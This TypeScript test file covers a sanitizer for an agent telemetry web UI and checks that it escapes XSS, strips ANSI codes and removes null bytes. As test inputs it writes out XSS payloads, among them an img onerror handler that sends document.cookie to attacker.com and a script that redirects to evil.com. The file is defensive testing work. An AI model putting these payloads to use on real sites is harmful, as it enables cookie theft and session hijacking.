import { describe, it, expect } from "vitest";

/**
 * UI Telemetry Sanitizer for rendering logs, argument inspection, and alert badges.
 * Neutralizes XSS attack vectors, strips ANSI escape sequences and null bytes,
 * preventing DOM injection and terminal spoofing.
 */
export function sanitizeTelemetryDisplay(rawInput: unknown): string {
  if (rawInput === null || rawInput === undefined) return "";
  let text = typeof rawInput === "string" ? rawInput : JSON.stringify(rawInput);

  // Strip ANSI color/terminal escape sequences (e.g., \x1b[31m) before removing control chars
  text = text.replace(/(?:\x1b|\u001b)\[[0-9;]*[a-zA-Z]/g, "");

  // Strip null bytes and control characters (except newline \n and tab \t)
  text = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");

  // Neutralize inline event handlers (onerror=, onload=, onclick=)
  text = text.replace(/\bon[a-z]+\s*=/gi, "blocked-handler=");

  // Escape HTML entities to prevent XSS in UI rendering
  text = text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;");

  return text;
}

describe("SUITE 2.3: Web UI - Telemetry Stream Rendering & XSS Injection Neutralization", () => {
  describe("XSS Tag & Event Handler Neutralization", () => {
    it("should neutralize raw script injection in agent tool arguments", () => {
      const maliciousPayload = `<script>alert('pwned')</script>`;
      const sanitized = sanitizeTelemetryDisplay(maliciousPayload);

      expect(sanitized).not.toContain("<script>");
      expect(sanitized).toContain("&lt;script&gt;alert(&#x27;pwned&#x27;)&lt;&#x2F;script&gt;");
    });

    it("should escape event handler injection vectors (img onerror, svg onload)", () => {
      const vector = `<img src="x" onerror="fetch('https://attacker.com?leak=' + document.cookie)" />`;
      const sanitized = sanitizeTelemetryDisplay(vector);

      expect(sanitized).not.toContain("<img");
      expect(sanitized).not.toContain("onerror=");
      expect(sanitized).toContain("&lt;img");
    });
  });

  describe("Control Characters & Terminal ANSI Sequence Stripping", () => {
    it("should strip null bytes to prevent string termination exploits", () => {
      const nullBytePayload = "admin_user\x00_impersonated";
      const sanitized = sanitizeTelemetryDisplay(nullBytePayload);

      expect(sanitized).toBe("admin_user_impersonated");
      expect(sanitized).not.toContain("\x00");
    });

    it("should strip ANSI color sequences from streaming logs", () => {
      const ansiColoredLog = "\x1b[31m[CRITICAL]\x1b[0m \x1b[32mPolicy evaluation failed\x1b[0m";
      const sanitized = sanitizeTelemetryDisplay(ansiColoredLog);

      expect(sanitized).toBe("[CRITICAL] Policy evaluation failed");
      expect(sanitized).not.toContain("\x1b");
    });
  });

  describe("Complex Object & Argument Rendering Safety", () => {
    it("should safely stringify and sanitize nested JSON objects with embedded XSS", () => {
      const objectPayload = {
        agentId: "agent_42",
        params: {
          query: "<script>window.location='http://evil.com'</script>",
          safeValue: 12345
        }
      };

      const sanitized = sanitizeTelemetryDisplay(objectPayload);
      expect(sanitized).not.toContain("<script>");
      expect(sanitized).toContain("&lt;script&gt;");
      expect(sanitized).toContain("12345");
    });

    it("should handle null and undefined safely", () => {
      expect(sanitizeTelemetryDisplay(null)).toBe("");
      expect(sanitizeTelemetryDisplay(undefined)).toBe("");
    });
  });
});
